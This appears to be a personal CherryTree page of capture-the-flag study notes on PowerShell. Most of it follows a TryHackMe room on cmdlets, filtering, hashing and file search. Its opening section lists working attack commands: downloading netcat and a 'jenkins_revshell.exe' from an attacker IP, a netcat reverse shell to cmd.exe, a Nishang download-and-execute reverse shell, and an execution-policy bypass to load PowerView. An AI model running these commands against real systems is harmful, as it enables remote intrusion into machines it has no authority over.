<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>powershell general</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>powershell general</h1><br/>powershell -c command<br /><br />The -c flag instructs the powershell to execute the command.<br /><br />Examples: <br /><br />powershell -c pwd<br />powershell -c cd C:\Users\sql_svc\Downloads; wget <a href="http://10.10.14.9/nc64.exe">http://{Attacker_IP}/nc64.exe</a> -outfile nc64.exe<br />powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {Attacker_IP} {Attacker Listening Port}<br /><br /><br /><strong>Downloading in Powershell:</strong><br /><br /><em>powershell -c Invoke-WebRequest -Uri &lt;URL&gt; -OutFile </em>&lt;OUTPUT-FILENAME&gt;<br /><em>powershell -c Invoke-WebRequest -Uri http://10.11.72.31/THM_WinPrivEsc_Tools/winPEASx64.exe -OutFile winPEASx64.exe</em><br /><br /><strong>Downloading in Powershell:</strong><br /><em>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.72.31:8000/jenkins_revshell.exe&#39;,&#39;jenkins_revshell.exe&#39;)&quot;</em><br /><em>powershell -c &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;</em>http://10.11.72.31:80/jenkins_revshell.exe&#39;,&#39;jenkins_revshell.exe&#39;)<em>&quot;</em><br /><br /><br /><strong>Reverse Shell using Nishang scripts:</strong><br /><em>cd /opt<br />git clone https://github.com/samratashok/nishang.git<br />cd /opt/nishang/Shells</em><br /><br /><strong>Note:</strong> We have to host the Invoke-PowerShellTcp.ps1 file with <em>python2 -m SimpleHTTPServer 80</em><br /><br /><em>powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.11.72.31:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 10.11.72.31 -Port 7777</em><br /><br /><br /><strong>PowerView Setup:</strong><br /><br />﻿1.) cd Downloads - navigate to the directory PowerView is in<br /><br />2.) powershell -ep bypass - load a powershell shell with execution policy bypassed<br /><br />3.) . .\PowerView.ps1 - import the PowerView module<br /><br /><img src="images/24-1.png" alt="images/24-1.png" /><br /><br /><strong><h1>THM Powershell Room</h1></strong><br /><br />Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.<br /><br />This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called <strong>Get-Command</strong>.<br /><br />Common verbs to use include:<br /><br />    ▪ Get<br />    ▪ Start<br />    ▪ Stop <br />    ▪ Read<br />    ▪ Write<br />    ▪ New<br />    ▪ Out<br />    <br />Most useful Commands: <strong>Get-Help</strong> and <strong>Get-Command</strong>    <br />    <br />To get the full list of approved verbs, visit the following link.<br /><strong>https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7</strong><br /><br /><br /><strong><h2>Using Get-Help</h2></strong><br /><br />Get-Help displays information about a cmdlet. To get help about a particular command, run the following:<br /><br /><strong>Get-Help Command-Name</strong><br /><br />You can also understand how exactly to use the command by passing in the <strong>-examples</strong> flag. This would return output like the following: <br /><br />Examples:<br /><br /><strong>Get-Help Get-ChildItem</strong><br /><strong>Get-Help Get-ChildItem -ShowWindow</strong><br /><strong>Get-Help Get-ChildItem -Examples<br />Get-Help Get-ChildItem -Full</strong><br /><br />Or Specific Help on a certain parameter<br /><br /><strong>Get-Help Get-ChildItem -Parameter Path</strong><br /><br />Eg. <strong>Get-Help Get-Command -examples</strong><br />Show help about the Get-Command cmdlet.<br /><img src="images/24-2.png" alt="images/24-2.png" /><br /><br /><br /><br /><strong><h2>Listing All Parameters</h2></strong><br /><br />Type the cmdlet then type <strong>-</strong> and hit <strong>Ctrl+Space</strong> <br />It will show all available parameters. (Use Tab &amp; Shift+Tab to go forward and backward)<br />Then we can use help to look at individual parameter description/help.<br /><br />Or<br /><br />To list all parameters on terminal use the following.<br /><strong>(Get-Command Get-ChildItem).Parameters</strong><br />It will show all available parameters.<br />Then we can use help to look at individual parameter description/help.<br /><br />Specific Help on a certain parameter<br /><br /><strong>Get-Help Get-ChildItem -Parameter Path</strong><br /><br /><br /><br /><strong><h2>Using Get-Command</h2></strong><br /><br />Get-Command gets all the cmdlets installed on the current Computer. The great thing about this cmdlet is that it allows for pattern matching like the following<br /><br /><strong>Get-Command Verb-*</strong> or <strong>Get-Command *-Noun</strong><br /><br />Running <strong>Get-Command New-*</strong> to view all the cmdlets for the verb new displays the following: <br /><br />Eg. <strong>Get-Command New-*</strong><br /><img src="images/24-3.png" alt="images/24-3.png" /><br /><br /><br /><strong><h2>Object Manipulation</h2></strong><br /><br />In the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things:<br /><br />    ▪ passing output to other cmdlets<br />    ▪ using specific object cmdlets to extract information<br /><br />The Pipeline (<strong>|</strong>) is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet<br /><br /><strong>Verb-Noun | Get-Member </strong><br /><br />An example of running this to view the members for Get-Command is:<br /><br /><strong>Get-Command | Get-Member -MemberType Method</strong><br /><br /><img src="images/24-4.png" alt="images/24-4.png" /><br /><br />From the above flag in the command, you can see that you can also select between methods and properties.<br /><strong>Get-Command | Get-Member -MemberType Property</strong><br /><br /><img src="images/24-5.png" alt="images/24-5.png" /><br /><br /><strong><h2>Creating Objects From Previous cmdlets</h2></strong><br /><br />One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the <strong>Select-Object</strong> cmdlet. <br /><br />Here&#39;s an example of listing the directories and just selecting the mode and the name:<br /><br /><strong>Get-ChildItem | Select-Object -Property Mode, Name</strong><br /><br /><img src="images/24-6.png" alt="images/24-6.png" /><br /><br />You can also use the following flags to select particular information:<br /><br />    ▪ first - gets the first x object<br />    ▪ last - gets the last x object<br />    ▪ unique - shows the unique objects<br />    ▪ skip - skips x objects<br />    <br /><strong>Eg. Get-ChildItem | Select-Object -Property Mode, Name -First 4</strong><br /><br /><img src="images/24-7.png" alt="images/24-7.png" /><br /><br /><strong><h2>Filtering Objects</h2></strong><br /><br />When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. <br /><br />The general format of the using this cmdlet is <br /><br /><strong>Verb-Noun | Where-Object -Property PropertyName -operator Value<br />Verb-Noun | Where-Object {$_.PropertyName -operator Value}</strong><br /><br />The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.<br />Note: Powershell is quite sensitive so make sure you don&#39;t put quotes around the command!<br /><br />Where <strong>-operator</strong> is a list of the following operators:<br /><br />    ▪ -Contains: if any item in the property value is an exact match for the specified value<br />    ▪ -EQ: if the property value is the same as the specified value<br />    ▪ -GT: if the property value is greater than the specified value<br /><br />For a full list of operators, use the following  link.<br /><strong>https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&amp;viewFallbackFrom=powershell-6</strong><br /><br />Here&#39;s an example of checking the stopped processes:<br /><br /><strong>Get-Service | Where-Object -Property Status -eq Stopped</strong><br /><img src="images/24-8.png" alt="images/24-8.png" /><br /><br /><br /><strong><h2>Sort Object</h2></strong><br /><br />When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.<br /><br />The format of the command would be<br /><br /><strong>Verb-Noun | Sort-Object</strong><br /><br />Here&#39;s an example of sort the list of directories:<br /><strong>Get-ChildItem | Sort-Object</strong><br /><img src="images/24-9.png" alt="images/24-9.png" /><br /><br /><br /><strong><h2>To Search a File</h2></strong><br /><br /> <strong>Get-ChildItem -Path C:\ -Include *interesting-file.txt* -Recurse -File </strong><br /> <strong>Get-ChildItem -Path C:\ -Include *interesting-file.txt* -Recurse -File -ErrorAction SilentlyContinue</strong><br /><br /><strong>Note:</strong> The <strong>include</strong> Parameter takes up search string within *Value* if the name is <strong>partial</strong> &amp; the <strong>ErrorAction</strong> Parameter is used to supress certain find errors.<br /><br />Actual Filename: <strong>interesting-file.txt.txt</strong><br /><br /><img src="images/24-10.png" alt="images/24-10.png" /><br /><br /><br /><strong><h2>Read Files</h2></strong><br /><br /><strong>Get-Content &quot;C:\Program Files\interesting-file.txt.txt&quot;</strong><br /><br /><img src="images/24-11.png" alt="images/24-11.png" /><br /><br /><strong><h2>Count No of cmdlets</h2></strong><br /><br /><strong>Get-Command | Measure</strong><br /><br />Shows the no of all the commands<br /><br /><img src="images/24-12.png" alt="images/24-12.png" /><br /><br />But if we want only cmdlets we need to add certain parameters<br /><br /><strong>Get-Command | Select-Object -First 2</strong><br />We use this to get the <strong>headings</strong>.<br /><br /><img src="images/24-13.png" alt="images/24-13.png" /><br /><br /><strong>Final Command</strong><br /><br /><strong>Get-Command | Where-Object -Property CommandType -eq Cmdlet | Measure</strong><br /><br /><img src="images/24-14.png" alt="images/24-14.png" /><br /><br /><strong><h2>Find MD5 Hash for a File</h2></strong><br /><br />Basic search about Hash<br /><br /><strong>Get-Command *hash*</strong><br /><br />Then we find all the parameter of <strong>Get-FileHash</strong> cmdlet<br /><br /><img src="images/24-15.png" alt="images/24-15.png" /><br /><br /><strong>Note:</strong> By default Powershell uses <strong>SHA256</strong>, we need to specify <strong>MD5</strong> in Algorithm parameter.<br /><br /><strong>Get-FileHash -Path &quot;C:\Program Files\interesting-file.txt.txt&quot;<br />Get-FileHash -Path &quot;C:\Program Files\interesting-file.txt.txt&quot; -Algorithm MD5</strong><br /><img src="images/24-16.png" alt="images/24-16.png" /><br /><br /><strong><h2>Find Current Working Directory</h2></strong><br /><br /><strong>Get-Location</strong><br /><br /><img src="images/24-17.png" alt="images/24-17.png" /><br /><br /><strong>To check if a PATH exists</strong><br /><br /><strong>Test-Path -Path “Full-Path-Here</strong>”<br />It returns <strong>True</strong> or <strong>False</strong><br /><br /><img src="images/24-18.png" alt="images/24-18.png" /><br /><br /><strong>Reuest a Webserver</strong><br /><br /><strong>Invoke-WebRequest</strong><br /><img src="images/24-19.png" alt="images/24-19.png" /><br /><br /><strong>Base64 Decode (uses External Software: certutil.exe)</strong><br /><br /><strong>certutil.exe -decode &quot;C:\Users\Administrator\Desktop\b64.txt&quot; output.txt</strong><br /><img src="images/24-20.png" alt="images/24-20.png" /><br /><br />Output will be created in the <strong>current directory</strong>, then we can view the contents using <strong>Get-Content</strong><br /><strong>Get-Content .\output.txt</strong><br /><img src="images/24-21.png" alt="images/24-21.png" /><br /><br />Or we can use native cmd command “<strong>type</strong>”<br /><br /><br /></div>
</body>
</html>
